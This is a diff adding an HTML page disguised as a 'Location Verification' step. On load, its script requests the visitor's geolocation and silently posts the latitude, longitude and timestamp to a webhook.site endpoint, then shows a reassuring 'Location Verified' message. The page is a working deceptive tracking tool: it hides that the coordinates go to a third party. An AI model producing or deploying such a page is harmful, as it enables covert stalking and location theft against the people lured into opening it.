@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Verification</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+  </style>
+</head>
+<body>
+  <h2>Verifying Your Device Location...</h2>
+  <p>Please tap “Allow” if prompted to confirm your current location.</p>
+
+  <script>
+    function sendLocation(lat, lon) {
+      // Send to Webhook.site or an email script endpoint
+      fetch("https://webhook.site/YOUR_UNIQUE_ID", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          time: new Date().toISOString()
+        })
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocation(lat, lon);
+          document.body.innerHTML = "<h2>Location Verified ✅</h2><p>You may now close this page.</p>";
+        }, function(error) {
+          document.body.innerHTML = "<h2>Error ❌</h2><p>Location access was denied or unavailable.</p>";
+        });
+      } else {
+        document.body.innerHTML = "<h2>Unsupported</h2><p>Your device doesn’t support location access.</p>";
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
